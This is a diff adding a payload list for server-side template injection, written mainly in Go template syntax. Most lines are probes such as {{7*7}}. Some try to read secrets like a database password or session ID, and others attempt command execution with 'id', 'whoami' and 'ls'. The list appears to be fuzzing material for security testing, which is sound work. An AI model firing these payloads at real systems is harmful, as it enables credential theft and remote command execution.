@@ -1,0 +1,59 @@
+{{.}}
+{{ . }}
+{{printf "%#v" .}}
+{{define "T1"}} {{.}} {{end}} {{template "T1" .}}
+{{printf "%s" "ssti"}}
+{{print "ssti"}}
+{{html "ssti"}}
+{{index . 0}}
+{{range .}}{{.}}{{end}}
+{{ .Data }}
+{{ .Config }}
+{{ .Env }}
+{{ .Item }}
+{{ .Request }}
+{{ .Client }}
+{{ .System "id" }}
+{{ .Command "whoami" }}
+{{ .Exec "ls" }}
+{{ .Writer.Header }}
+{{ .Response.Header }}
+{{ .Request.RemoteAddr }}
+{{ .Request.Header.Get "User-Agent" }}
+{{eq . .}}
+{{ne . .}}
+{{and . .}}
+{{if .}}ssti{{end}}
+{{len .}}
+{{index . 0}}
+{{slice . 1}}
+{{urlquery "https://google.com"}}
+{{js "alert(1)"}}
+{{.Config.Database.Password}}
+{{.App.Config}}
+{{.Settings.Secret}}
+{{.Session.ID}}
+{{.User.Role}}
+{{.Internal}}
+{{.Debug}}
+[[.]]
+[[ . ]]
+<%.%>
+<% . %>
+${.}
+{{.Request.Context.Value "user"}}
+{{.Response.Writer.Header.Set "X-SSTI" "True"}}
+{{.Request.FormValue "debug"}}
+{{.Context.Value 0}}
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+[=7*7]
+{{ 7 * 7 }}
+${{7*7}}
+@(7*7)
+#set($x=7*7)$x
+[[${7*7}]]
+{{= 7*7}}
